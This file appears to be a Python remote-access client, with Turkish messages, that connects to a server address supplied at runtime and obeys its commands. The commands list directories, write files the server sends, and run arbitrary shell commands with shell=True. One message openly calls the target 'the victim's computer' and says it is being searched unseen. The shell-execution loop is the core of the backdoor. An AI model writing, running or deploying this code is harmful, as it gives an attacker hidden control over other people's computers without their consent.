import os
import socket
import subprocess

sunucu = socket.socket()
host = input(str("Sunucu adresini girin: "))
port = 8080
sunucu.connect((host,port))
print("")
print("Sunucuya başarılı bir şekilde bağlandı.")
print("")

#Bağlantı tamamlandı

#Komutları alıp uygulayacağız

while 1:
    komut = sunucu.recv(1204)
    komut = komut.decode()
    print("Komut alındı")
    print("")
    if komut == "view_cwd":
        dosyalar = os.getcwd()
        dosyalar = str(dosyalar)
        sunucu.send(dosyalar.encode())
        print("Komut başarılı bir şekilde yürütüldü.")
        
    elif komut =="custom_dir":
            kullanici_giris = sunucu.recv(5000)
            kullanici_giris = kullanici_giris.decode()
            dosyalar = os.listdir(kullanici_giris)
            dosyalar = str(dosyalar)
            sunucu.send(dosyalar.encode())
            print("")
            print("Komut başarıyla yürütüldü.")
            print("")
            
    elif komut == "send_files":
        dosya_adi = sunucu.recv(6000)
        print(dosya_adi)
        yeni_dosya = open(dosya_adi, "wb")
        veri = sunucu.recv(6000)
        print(veri)
        yeni_dosya.write(veri)
        yeni_dosya.close()
        
    elif komut == "cmd":                  
        cmd = sunucu.recv(10000)
        print(cmd)          
        p =subprocess.Popen(cmd.decode('utf-8'), stdout=subprocess.PIPE, shell=True)
        out, err = p.communicate()
        result = out.decode('utf8').split('\n')
        for lin in result:
            if not lin.startswith('#'):
                print(lin)
        print("")
        print("Kurbanın bilgisayarında görünmeden kazı işlemi gerçekleştiriliyor.")
        print("")
        
    else :
        print("")
        print("Komut tanınamadı.")
